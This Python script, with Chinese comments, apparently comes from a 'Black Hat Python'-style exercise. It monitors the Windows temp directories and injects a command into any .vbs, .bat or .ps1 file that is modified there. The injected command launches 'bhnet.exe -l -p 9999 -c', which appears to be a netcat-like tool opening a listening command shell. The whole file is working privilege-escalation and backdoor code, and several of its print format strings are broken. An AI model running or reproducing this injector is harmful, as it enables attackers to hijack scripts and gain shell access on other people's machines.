# -*- coding:utf-8 -*-
import tempfile
import threading
import win32file
import win32con
import os


# 这些是典型的临时文件所在的路径
dirs_to_monitor = ["c:\\Windows\\Temp",tempfile.gettempdir()]

# 文件修改行为对应的常量
FILE_CREATED		= 1
FILE_DELETED		= 2
FILE_MODIFIED	    = 3
FILE_RENAMED_FROM   = 4
FILE_RENAMED_TO	    = 5

file_types = {}

command = "C:\\Windows\\Temp\\bhnet.exe -l -p 9999 -c"
file_types['.vbs'] = ["\r\n'bhpmarker\r\n",
	"\r\nCreateObject(\"Wscript.Shell\").Run(\"%s\")\r\n" % command]
file_types['.bat'] = ["\r\nREM bnpmarker\r\n",
	"\r\n%s\r\n" % command]
file_types['.ps1'] = ["\r\n#bhpmarker",
	"Start-Process \"%s\"\r\n" % command]

# 用于执行代码插入的函数
def inject_code(full_filename,extension,contents):
	print("进入注入函数")
	print(contents)
	print(file_types[extension][0])
	# 判断文件是否存在标记
	if file_types[extension][0] in contents:
		return
	# 如果文件没有标记，插入代码并标记
	print("进入注入函数")
	full_contents = file_types[extension][0]
	full_contents += file_types[extension][1]
	full_contents += contents
	print("获取内容完成")

	fd = open(full_filename,"wb")
	fd.write(full_contents)
	fd.close()
	print("写入文件完成")

	print("[-o-] Injected code.")
	return

def monitor(path_to_watch):
	# 为每个监控器起一个线程
	FILE_LIST_DIRECTORY = 0x0001

	h_directory = win32file.CreateFile(
		path_to_watch,
		FILE_LIST_DIRECTORY,
		win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE | win32con.FILE_SHARE_DELETE,
		None,
		win32con.OPEN_EXISTING,
		win32con.FILE_FLAG_BACKUP_SEMANTICS,
		None)

	while 1:
		try:
			results = win32file.ReadDirectoryChangesW(
				h_directory,
				1024,
				True,
				win32con.FILE_NOTIFY_CHANGE_FILE_NAME | 
				win32con.FILE_NOTIFY_CHANGE_DIR_NAME | 
				win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES |
				win32con.FILE_NOTIFY_CHANGE_SIZE |
				win32con.FILE_NOTIFY_CHANGE_LAST_WRITE | 
				win32con.FILE_NOTIFY_CHANGE_SECURITY,
				None,
				None)
			for action,fielname in results:
				full_filename = os.path.join(path_to_watch,
					fielname)
				if action == 1:
					print("[ + ] Created %" % full_filename)
				elif action == 2:
					print("[ - ] Deleted %" % full_filename)
				elif action == 3:
					print("[ * ] Modified %s" % full_filename)

					# 输出文件内容
					print("[vvv] Dumping contents...")

					try:
						fd = open(full_filename,"rb")
						contents = fd.read()
						fd.close()
						print(contents)
						print("[^^^] Dumping complete.")
					except:
						print("[!!!] Failed.")
					filename,extension = os.path.splitext(full_filename)
					if extension in file_types:
						print("执行注入")
						inject_code(full_filename,extension,contents)
						print("完成注入")
				elif action == 4:
					print("[ > ] Renamed from:" % full_filename)
				elif action == 5:
					print("[ > ] Renamed to:" % full_filename)
				else:
					print("[???] Unknown:" % full_filename)
		except:
			pass

def start_monitor():
	for path in dirs_to_monitor:
		monitor_thread = threading.Thread(target=monitor,args=(path,))
		print("Spawing monitor thread for path:%s" % path)
		monitor_thread.start()

if __name__ == "__main__":
	start_monitor()

